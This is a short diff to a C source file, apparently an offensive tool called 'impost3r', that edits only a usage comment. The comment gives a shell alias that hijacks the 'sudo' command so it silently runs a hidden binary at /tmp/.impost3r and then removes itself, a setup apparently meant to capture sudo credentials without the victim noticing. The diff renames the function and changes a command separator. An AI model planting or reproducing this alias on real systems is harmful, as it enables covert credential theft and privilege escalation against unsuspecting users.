@@ -29,13 +29,13 @@ int successFlag = 1;
 
 /*
     Usage：
-        alias sudo='imposter() {
+        alias sudo='impost3r() {
         if [ -f "/tmp/.impost3r" ]; then
         /tmp/.impost3r "$@" && unalias sudo
         else
-        unalias sudo && sudo "$@"
+        unalias sudo;sudo "$@"
         fi
-        }; imposter'
+        }; impost3r'
 */
 
 void 
